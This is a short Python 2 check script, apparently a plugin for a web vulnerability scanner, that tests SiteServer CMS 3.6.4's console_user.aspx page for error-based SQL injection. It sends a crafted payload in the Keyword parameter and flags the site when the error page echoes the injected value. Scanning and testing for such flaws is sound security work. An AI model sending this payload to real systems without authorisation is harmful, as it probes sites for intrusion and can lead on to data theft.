#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "siteserver/cms/console_user.aspx?PageNum=0&Keyword=1%27%20and%201=str(123.4,8,4)%20and%201=%271&CreateDate=0&LastActivityDate=0&TypeID=0&DepartmentID=0&AreaID=0"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '500' and content.find('varchar')>=0 and content.find('123.4000')>=0 and content.find('int')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:SiteServer3_6_4_console_user_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:SiteServer3_6_4_console_user_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def